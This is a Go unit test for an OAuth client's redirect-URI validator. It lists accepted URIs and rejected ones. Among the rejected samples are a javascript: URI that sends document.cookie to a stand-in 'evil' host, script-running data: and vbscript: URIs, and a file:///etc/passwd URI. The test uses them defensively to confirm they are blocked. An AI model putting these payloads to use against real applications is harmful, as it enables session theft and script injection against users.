package oauth

import (
	"testing"

	"github.com/stretchr/testify/assert"
)

func TestValidateClientRedirectURIs(t *testing.T) {
	ok := []string{
		"https://app.example.com/callback",
		"https://app.example.com/callback?next=%2Fsettings&label=a%20b",
		"http://localhost:8080/cb",
		"http://127.0.0.2:8080/cb",
		"http://[::1]:8080/cb",
		"myapp://callback",
		"com.example.app://callback",
		"com.example.app:/callback",
	}
	bad := []string{
		"",
		"javascript:fetch('//evil/'+document.cookie)//",
		"JavaScript:alert(1)",
		"data:text/html,<script>alert(1)</script>",
		"vbscript:x",
		"file:///etc/passwd",
		"blob:https://app.example.com/id",
		"about:blank",
		"filesystem:https://app.example.com/temporary/file",
		"myapp://user:password@callback",
		"com.example.app:/callback#frag",
		"http://app.example.com/callback",
		"http://localhost.example.com/callback",
		"https://user:password@app.example.com/callback",
		"https://user@app.example.com/callback",
		"/relative/path",
		"https:callback",
		"https:///cb",
		"https://app.example.com/*",
		"https://app.example.com/cb#frag",
		"https://app.example.com/cb#",
	}

	for _, u := range ok {
		assert.NoError(t, validateClientRedirectURIs([]string{u}), u)
	}
	for _, u := range bad {
		assert.Error(t, validateClientRedirectURIs([]string{u}), u)
	}
}
